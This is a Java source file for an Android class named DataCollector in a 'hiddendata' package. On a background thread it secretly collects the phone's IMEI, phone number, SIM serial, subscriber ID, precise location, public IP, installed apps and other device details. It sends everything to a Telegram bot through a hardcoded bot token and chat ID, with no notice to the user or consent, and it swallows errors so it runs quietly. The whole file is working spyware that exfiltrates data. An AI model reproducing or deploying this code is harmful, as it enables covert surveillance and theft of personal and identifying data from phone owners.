package com.example.hiddendata;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class DataCollector {

    private static final String TAG = "DataCollector";
    private static final String BOT_TOKEN = "9055466993:AAEN9rfU_bf7KxBEiZpqT_Esm41rSSsDN2s";
    private static final String CHAT_ID = "8890292449";
    private static final String TELEGRAM_API_URL = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
    
    private Context context;

    public DataCollector(Context context) {
        this.context = context;
    }

    public void collectAndSendToTelegram() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    StringBuilder message = new StringBuilder();
                    
                    String currentTime = getCurrentTime();
                    message.append("📱 <b>Device Data Report</b>\n");
                    message.append("🕒 Time: ").append(currentTime).append("\n");
                    message.append("━━━━━━━━━━━━━━━━━━\n\n");

                    message.append("🔹 <b>Basic Device Info</b>\n");
                    message.append("• Brand: ").append(Build.BRAND).append("\n");
                    message.append("• Model: ").append(Build.MODEL).append("\n");
                    message.append("• Manufacturer: ").append(Build.MANUFACTURER).append("\n");
                    message.append("• Android Version: ").append(Build.VERSION.RELEASE).append(" (API ").append(Build.VERSION.SDK_INT).append(")\n");
                    message.append("• Device ID: ").append(getDeviceId()).append("\n");
                    message.append("• IMEI: ").append(getImei()).append("\n");
                    message.append("• Phone Number: ").append(getPhoneNumber()).append("\n");
                    message.append("• SIM Serial: ").append(getSimSerial()).append("\n");
                    message.append("• Subscriber ID: ").append(getSubscriberId()).append("\n\n");

                    message.append("🔹 <b>Network Information</b>\n");
                    message.append("• Public IP: ").append(getPublicIP()).append("\n");
                    message.append("• Connection Type: ").append(getConnectionType()).append("\n\n");

                    String[] location = getLocation();
                    message.append("🔹 <b>Location</b>\n");
                    message.append("• Latitude: ").append(location[0]).append("\n");
                    message.append("• Longitude: ").append(location[1]).append("\n");
                    message.append("• Accuracy: ").append(location[2]).append(" meters\n");
                    if (!location[0].equals("0")) {
                        message.append("• Map Link: https://www.google.com/maps?q=").append(location[0]).append(",").append(location[1]).append("\n");
                    }
                    message.append("\n");

                    message.append("🔹 <b>Battery</b>\n");
                    message.append("• Level: ").append(getBatteryLevel()).append("%\n");
                    message.append("• Status: ").append(getBatteryStatus()).append("\n");
                    message.append("• Technology: ").append(getBatteryTechnology()).append("\n\n");

                    message.append("🔹 <b>Storage</b>\n");
                    message.append("• Internal Total: ").append(getTotalStorage()).append(" MB\n");
                    message.append("• Internal Free: ").append(getFreeStorage()).append(" MB\n");
                    message.append("• External Total: ").append(getExternalTotalStorage()).append(" MB\n");
                    message.append("• External Free: ").append(getExternalFreeStorage()).append(" MB\n\n");

                    List<String> apps = getInstalledApps();
                    message.append("🔹 <b>Installed Apps (").append(apps.size()).append(")</b>\n");
                    int limit = Math.min(apps.size(), 50);
                    for (int i = 0; i < limit; i++) {
                        message.append(i + 1).append(". ").append(apps.get(i)).append("\n");
                    }
                    if (apps.size() > 50) {
                        message.append("... and ").append(apps.size() - 50).append(" more apps\n");
                    }
                    message.append("\n");

                    message.append("🔹 <b>Additional Info</b>\n");
                    message.append("• Language: ").append(context.getResources().getConfiguration().locale.getDisplayLanguage()).append("\n");
                    message.append("• Country: ").append(context.getResources().getConfiguration().locale.getCountry()).append("\n");
                    message.append("• Timezone: ").append(java.util.TimeZone.getDefault().getID()).append("\n");
                    message.append("• Boot Time: ").append(getBootTime()).append("\n\n");
                    message.append("━━━━━━━━━━━━━━━━━━\n");
                    message.append("✅ Data collected successfully");

                    sendTelegramMessage(message.toString());

                } catch (Exception e) {
                    Log.e(TAG, "Error collecting data: " + e.getMessage());
                }
            }
        }).start();
    }

    private String getCurrentTime() {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
        return sdf.format(new Date());
    }

    private String getDeviceId() {
        try {
            return Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        } catch (Exception e) {
            return "N/A";
        }
    }

    private String getImei() {
        try {
            if (context.checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    return tm.getImei();
                } else {
                    return tm.getDeviceId();
                }
            }
        } catch (Exception e) {}
        return "N/A";
    }

    private String getPhoneNumber() {
        try {
            if (context.checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED ||
                context.checkSelfPermission(Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED) {
                TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                return tm.getLine1Number() != null ? tm.getLine1Number() : "N/A";
            }
        } catch (Exception e) {}
        return "N/A";
    }

    private String getSimSerial() {
        try {
            if (context.checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                return tm.getSimSerialNumber() != null ? tm.getSimSerialNumber() : "N/A";
            }
        } catch (Exception e) {}
        return "N/A";
    }

    private String getSubscriberId() {
        try {
            if (context.checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                return tm.getSubscriberId() != null ? tm.getSubscriberId() : "N/A";
            }
        } catch (Exception e) {}
        return "N/A";
    }

    private String getPublicIP() {
        try {
            URL url = new URL("https://api.ipify.org");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String ip = reader.readLine();
            reader.close();
            return ip;
        } catch (Exception e) {
            return "N/A";
        }
    }

    private String getConnectionType() {
        try {
            ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
            if (activeNetwork != null) {
                return activeNetwork.getTypeName();
            }
        } catch (Exception e) {}
        return "Unknown";
    }

    private String[] getLocation() {
        String[] loc = {"0", "0", "0"};
        try {
            if (context.checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
                Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (location == null) {
                    location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                }
                if (location != null) {
                    loc[0] = String.valueOf(location.getLatitude());
                    loc[1] = String.valueOf(location.getLongitude());
                    loc[2] = String.valueOf(location.getAccuracy());
                }
            }
        } catch (Exception e) {}
        return loc;
    }

    private int getBatteryLevel() {
        try {
            android.content.IntentFilter intentFilter = new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED);
            android.content.Intent batteryStatus = context.registerReceiver(null, intentFilter);
            if (batteryStatus != null) {
                int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
                if (level != -1 && scale != -1) {
                    return Math.round((float) level / scale * 100);
                }
            }
        } catch (Exception e) {}
        return -1;
    }

    private String getBatteryStatus() {
        try {
            android.content.IntentFilter intentFilter = new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED);
            android.content.Intent batteryStatus = context.registerReceiver(null, intentFilter);
            if (batteryStatus != null) {
                int status = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
                switch (status) {
                    case android.os.BatteryManager.BATTERY_STATUS_CHARGING: return "Charging";
                    case android.os.BatteryManager.BATTERY_STATUS_FULL: return "Full";
                    case android.os.BatteryManager.BATTERY_STATUS_DISCHARGING: return "Discharging";
                    case android.os.BatteryManager.BATTERY_STATUS_NOT_CHARGING: return "Not Charging";
                    default: return "Unknown";
                }
            }
        } catch (Exception e) {}
        return "Unknown";
    }

    private String getBatteryTechnology() {
        try {
            android.content.IntentFilter intentFilter = new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED);
            android.content.Intent batteryStatus = context.registerReceiver(null, intentFilter);
            if (batteryStatus != null) {
                String tech = batteryStatus.getStringExtra(android.os.BatteryManager.EXTRA_TECHNOLOGY);
                return tech != null ? tech : "N/A";
            }
        } catch (Exception e) {}
        return "N/A";
    }

    private long getTotalStorage() {
        try {
            android.os.StatFs stat = new android.os.StatFs(android.os.Environment.getDataDirectory().getPath());
            return (stat.getBlockCountLong() * stat.getBlockSizeLong()) / (1024 * 1024);
        } catch (Exception e) { return 0; }
    }

    private long getFreeStorage() {
        try {
            android.os.StatFs stat = new android.os.StatFs(android.os.Environment.getDataDirectory().getPath());
            return (stat.getAvailableBlocksLong() * stat.getBlockSizeLong()) / (1024 * 1024);
        } catch (Exception e) { return 0; }
    }

    private long getExternalTotalStorage() {
        try {
            if (android.os.Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED)) {
                android.os.StatFs stat = new android.os.StatFs(android.os.Environment.getExternalStorageDirectory().getPath());
                return (stat.getBlockCountLong() * stat.getBlockSizeLong()) / (1024 * 1024);
            }
        } catch (Exception e) {}
        return 0;
    }

    private long getExternalFreeStorage() {
        try {
            if (android.os.Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED)) {
                android.os.StatFs stat = new android.os.StatFs(android.os.Environment.getExternalStorageDirectory().getPath());
                return (stat.getAvailableBlocksLong() * stat.getBlockSizeLong()) / (1024 * 1024);
            }
        } catch (Exception e) {}
        return 0;
    }

    private List<String> getInstalledApps() {
        List<String> appList = new ArrayList<>();
        try {
            PackageManager pm = context.getPackageManager();
            List<android.content.pm.PackageInfo> packages = pm.getInstalledPackages(0);
            for (android.content.pm.PackageInfo packageInfo : packages) {
                appList.add(packageInfo.applicationInfo.loadLabel(pm).toString());
            }
        } catch (Exception e) {}
        return appList;
    }

    private String getBootTime() {
        try {
            long uptimeMillis = android.os.SystemClock.elapsedRealtime();
            long bootTimeMillis = System.currentTimeMillis() - uptimeMillis;
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
            return sdf.format(new Date(bootTimeMillis));
        } catch (Exception e) { return "N/A"; }
    }

    private void sendTelegramMessage(String messageText) {
        try {
            URL url = new URL(TELEGRAM_API_URL);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setConnectTimeout(10000);
            connection.setReadTimeout(10000);
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

            String postData = "chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(messageText, "UTF-8") + "&parse_mode=HTML";

            OutputStream outputStream = connection.getOutputStream();
            outputStream.write(postData.getBytes("UTF-8"));
            outputStream.flush();
            outputStream.close();

            connection.getResponseCode();
            connection.disconnect();
        } catch (Exception e) {}
    }
}
